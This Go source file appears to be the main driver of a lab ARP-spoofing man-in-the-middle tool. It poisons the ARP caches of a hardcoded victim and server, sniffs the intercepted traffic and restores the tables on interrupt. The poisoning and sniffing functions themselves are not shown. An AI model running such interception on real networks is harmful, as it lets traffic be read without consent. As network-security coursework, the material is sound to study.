package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"
)

func main() {
	typeToFilter := flag.String("f", "", "Type to filter ex: Arp")
	flag.Parse()

	// attaquant_ip := net.ParseIP("10.0.0.30")
	attaquant_mac, _ := net.ParseMAC("02:42:0a:00:00:0c")

	victime_ip := net.ParseIP("10.0.0.20")
	victime_mac, _ := net.ParseMAC("02:42:0A:00:00:0B")

	serveur_ip := net.ParseIP("10.0.0.10")
	serveur_mac, _ := net.ParseMAC("02:42:0A:00:00:0A")

	// ip_target := serveur_ip
	// mac_target := serveur_mac
	// ip_src := victime_ip
	// mac_src := attaquant_mac

	// A decommenter apres pour faire les param par arg
	// -------------------------------------------------------
	// var ip_src string
	// var mac_src string
	// var ip_target string
	// var mac_target string

	// if !setup(&ip_src, &mac_src, &ip_target, &mac_target) {
	// 	return
	// }
	// -------------------------------------------------------

	// restoreMac := discoverRealGatewayMAC(ip_src)
	// if restoreMac == nil {
	// 	fmt.Println("Original mac addr of ip to usurpate is not find")
	// 	return
	// }
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		c := make(chan os.Signal, 1)
		signal.Notify(c, os.Interrupt)
		<-c
		signal.Reset()
		cancel()
		fmt.Println("\nStarting cleaning")
		time.Sleep(1 * time.Second)
		launchRecuperation(victime_ip, attaquant_mac, serveur_ip, serveur_mac)
		launchRecuperation(serveur_ip, attaquant_mac, victime_ip, victime_mac)
		fmt.Println("CLEANING DONE")
	}()
	go launchPoisoning(victime_ip, attaquant_mac, serveur_ip, serveur_mac, ctx)
	go launchPoisoning(serveur_ip, attaquant_mac, victime_ip, victime_mac, ctx)

	launchSniffing(*typeToFilter, attaquant_mac)
	for {
	}

	// -------------------------------------------------------

	// Block until a signal is received.
	// s := <-c
	// fmt.Println("Got signal:", s)
	// fmt.Println("ARP TABLE RESTAURATION:", s)

}
